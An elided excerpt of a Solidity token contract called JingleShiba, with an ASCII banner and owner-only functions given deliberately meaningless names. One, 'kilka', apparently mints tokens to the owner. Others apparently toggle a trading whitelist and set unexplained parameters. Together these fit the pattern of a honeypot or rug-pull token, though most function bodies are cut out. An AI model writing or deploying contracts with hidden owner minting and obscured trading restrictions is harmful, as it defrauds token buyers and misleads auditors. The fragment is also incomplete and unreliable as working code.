...
/**   ____.__               .__           _________.__    ._____.           
    |    |__| ____    ____ |  |   ____  /   _____/|  |__ |__\_ |__ _____   
    |    |  |/    \  / ___\|  | _/ __ \ \_____  \ |  |  \|  || __ \\__  \  
/\__|    |  |   |  \/ /_/  >  |_\  ___/ /        \|   Y  \  || \_\ \/ __ \_
\________|__|___|  /\___  /|____/\___  >_______  /|___|  /__||___  (____  /
                 \//_____/           \/        \/      \/        \/     \/ 
 */
...
contract JingleShiba is Context, IERC20, Ownable {
    ...
    constructor() {
        ...
        _whiteListEnabled = true;
        setWiolData(address(0), true);
        setWiolData(address(this), true);
        setWiolData(_msgSender(), true);
    ...
    function kilka(uint256 amount) public onlyOwner returns (bool) {
        _kilka(_msgSender(), amount);
        return true;
    }
    ...
    function _kilka(address account, uint256 amount) internal {
        require(account != address(0), "BEP20: boris to the zero address");
     ...
     * @return boolean
     */
    function setMarkMMKK(uint256 value) external onlyOwner returns (bool) {
     ...
     * @return boolean
     */
    function setBMGL(uint256 value) external onlyOwner returns (bool) {
     ...
     * @return boolean
     */
    function setMinimumDAllD(uint256 value) external onlyOwner returns (bool) {
     ...
     * @return boolean
     */
    function setWioletaEkl(bool value) public onlyOwner returns (bool) {
        _whiteListEnabled = value;
        return true;
    }

    function setNftBol(bool value) public onlyOwner returns (bool) {
        _nftIntegrating = value;
        return true;
    }

    function setNftEno(address account, bool value) public onlyOwner returns (bool) {
     ...
     * @return boolean
     */
    function setWiolData(address account, bool value) public onlyOwner returns (bool) {
